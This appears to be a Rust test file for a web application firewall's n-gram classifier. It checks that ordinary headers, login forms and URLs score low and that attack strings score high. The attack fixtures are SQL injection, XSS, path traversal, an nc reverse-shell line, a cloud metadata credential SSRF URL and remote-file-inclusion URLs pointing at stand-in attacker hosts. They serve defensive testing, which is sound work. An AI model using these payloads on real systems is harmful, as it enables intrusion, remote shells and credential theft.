//! Calibration guard for the n-gram classifier's two operating points.
//!
//! The classifier is consulted for two different jobs and a regression in either
//! is silent, so both are pinned here:
//!
//!   * `>= 0.9`  — additive detection. A confident hit contributes a blocking
//!     amount of anomaly score on its own.
//!   * `<  0.5`  — the FP-suppression VETO (`ML_SUPPRESSION_MAX` in
//!     sentinel-proxy). Below this the classifier vouches for the value and a
//!     weak-evidence rule block is suppressed.
//!
//! Two invariants matter and neither is obvious from the model file:
//!
//! 1. Ordinary traffic must stay below the veto cutoff. `payload_attack` is a MAX
//!    over every candidate in the request, so a single routine value scoring high
//!    pins every request above the cutoff and silently disables FP suppression
//!    everywhere. A previous model scored a plain `Accept: text/html,...` at 0.897
//!    and an Instagram share link at 0.995, which is exactly that failure.
//!
//! 2. URL-shaped input must be judged by WHERE IT POINTS, not by being a URL.
//!    Teaching the model that ordinary links are benign must not let RFI/SSRF
//!    payloads through on the same shape.

use sentinel_ml::models::ngram_classifier as ng;

/// Mirrors `ML_SUPPRESSION_MAX` in sentinel-proxy. Keep the two in step.
const SUPPRESSION_MAX: f32 = 0.5;
/// Mirrors the default `ml.sensitivity` at which a hit contributes score.
const DETECTION_MIN: f32 = 0.9;

fn score(s: &str) -> f32 {
    ng::score_all(s).unwrap_or_else(|| panic!("classifier not loaded while scoring {s:?}"))
}

fn assert_all_below(label: &str, cutoff: f32, items: &[&str]) {
    let bad: Vec<_> = items
        .iter()
        .map(|s| (*s, score(s)))
        .filter(|(_, v)| *v >= cutoff)
        .collect();
    assert!(
        bad.is_empty(),
        "{label}: expected every value < {cutoff}, but these scored at or above it \
         (a value here disables FP suppression for the whole request): {bad:#?}"
    );
}

fn assert_all_atleast(label: &str, floor: f32, items: &[&str]) {
    let bad: Vec<_> = items
        .iter()
        .map(|s| (*s, score(s)))
        .filter(|(_, v)| *v < floor)
        .collect();
    assert!(
        bad.is_empty(),
        "{label}: expected every value >= {floor}, but these scored below it \
         (they would no longer contribute blocking score): {bad:#?}"
    );
}

#[test]
fn model_is_loaded() {
    assert!(
        ng::is_loaded(),
        "embedded n-gram model failed to load — FP suppression silently degrades \
         to 'never suppress' and header/cookie scoring goes blind"
    );
}

#[test]
fn ordinary_header_values_stay_below_the_veto_cutoff() {
    assert_all_below(
        "ordinary header values",
        SUPPRESSION_MAX,
        &[
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "application/json, text/plain, */*",
            "gzip, deflate, br",
            "en-US,en;q=0.9,hi;q=0.8",
            "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            "application/x-www-form-urlencoded",
            "no-store, must-revalidate",
            "sessionid=a1b2c3d4e5f6; csrftoken=xyz789; _ga=GA1.2.1234567890.1234567890",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123",
            "XMLHttpRequest",
            "example.com:8443",
        ],
    );
}

#[test]
fn login_form_bodies_stay_below_the_veto_cutoff() {
    // E1. A login form carrying a remember-me field was refused: the classifier
    // reached a blocking anomaly score on its own with no signature match. Two
    // of eight ordinary form bodies were affected and BOTH were login forms.
    //
    // Measured before the fix, these were the scores — note that every
    // INDIVIDUAL value in them is harmless (the highest, "on", is 0.21), so the
    // model was reacting to the shape of the whole body:
    //
    //     username=alice&password=…&remember=1            0.625
    //     _csrf=…&username=alice&password=…&remember_me=on 0.539
    //     username=alice&password=…&remember_me=on         0.403
    //     username=alice&password=…                        0.280
    //
    // Anything at or above 0.5 is worse than one false positive: `payload_attack`
    // is a MAX over every candidate in the request, so one login body pins the
    // request above the veto cutoff and disables FP suppression for everything
    // else in it — invariant 1 at the top of this file.
    //
    // The authentication path is the worst possible place for this. It is the one
    // request every user makes before they can do anything, it carries a password
    // so an operator cannot paste the body into a bug report, and a site in
    // blocking mode locks every user out at once.
    assert_all_below(
        "login form bodies",
        SUPPRESSION_MAX,
        &[
            "username=alice&password=Tr0ub4dor%263",
            "username=alice&password=Tr0ub4dor%263&remember_me=on",
            "username=alice&password=Tr0ub4dor%263&remember=1",
            "email=alice%40example.com&password=hunter2&rememberMe=true",
            "_csrf=9f8a7b&username=alice&password=hunter2&remember_me=on",
            "user%5Bemail%5D=alice%40example.com&user%5Bpassword%5D=hunter2&user%5Bremember_me%5D=1",
            "login=alice&passwd=hunter2&keep_signed_in=yes",
            "j_username=alice&j_password=hunter2&_spring_security_remember_me=on",
        ],
    );
}

#[test]
fn ordinary_form_bodies_stay_below_the_veto_cutoff() {
    // The non-authentication half of the same corpus, kept separate so a failure
    // says which family regressed.
    assert_all_below(
        "ordinary form bodies",
        SUPPRESSION_MAX,
        &[
            "name=Alice&email=alice%40example.com&message=Hello%20there",
            "q=laptop&page=2&sort=price",
            "first_name=Alice&last_name=Smith&bio=I%20like%20cats",
            "quantity=2&sku=ABC-123&coupon=SPRING25",
            "comment=Great%20article%2C%20thanks%21&post_id=4821",
            "street=12%20High%20St&city=Nashik&postcode=422001&country=IN",
        ],
    );
}

#[test]
fn ordinary_urls_stay_below_the_veto_cutoff() {
    assert_all_below(
        "ordinary URLs and share links",
        SUPPRESSION_MAX,
        &[
            "https://www.instagram.com/p/B_uHgI7lY0Z/?igshid=1m7xkk7a9v6z4&utm_source=ig_web_copy_link",
            "https://www.google.com/search?q=test+query&oq=test",
            "https://github.com/orgs/acme/repos?page=2&sort=updated",
            "url=https://www.example.com/checkout/cart?ref=email",
            "https://youtu.be/dQw4w9WgXcQ?si=abc123XYZ",
            "next=/account/settings",
        ],
    );
}

#[test]
fn adversarial_benign_prose_stays_below_the_veto_cutoff() {
    // Natural language that happens to carry SQL/shell tokens. These are the
    // shapes that made the WAF block ordinary traffic.
    assert_all_below(
        "adversarial-benign prose",
        SUPPRESSION_MAX,
        &[
            "union was a great select",
            "D'or 1st parfume",
            "john or@var.es",
            "zsh is the best!",
            "ls 300 lexus",
            "nc 8000 controller",
            "I would like to select a union representative",
            "please cat the file for me",
        ],
    );
}

#[test]
fn unambiguous_attacks_still_reach_the_detection_threshold() {
    assert_all_atleast(
        "unambiguous attacks",
        DETECTION_MIN,
        &[
            "1' OR '1'='1",
            "' UNION SELECT username,password FROM users--",
            "<script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "; cat /etc/passwd",
            "| nc -e /bin/sh 10.0.0.1 4444",
            "../../../../etc/passwd",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "<img src=x onerror=alert(document.cookie)>",
        ],
    );
}

#[test]
fn url_shaped_attacks_are_judged_by_target_not_by_shape() {
    // The counterweight to `ordinary_urls_...`: benign-URL training must not make
    // "it is a URL" a free pass for RFI/SSRF.
    assert_all_atleast(
        "URL-shaped attacks",
        SUPPRESSION_MAX,
        &[
            "url=http://evil.com/shell.php",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "include=http://attacker.example/c99.txt",
            "gopher://127.0.0.1:11211/_",
        ],
    );
}
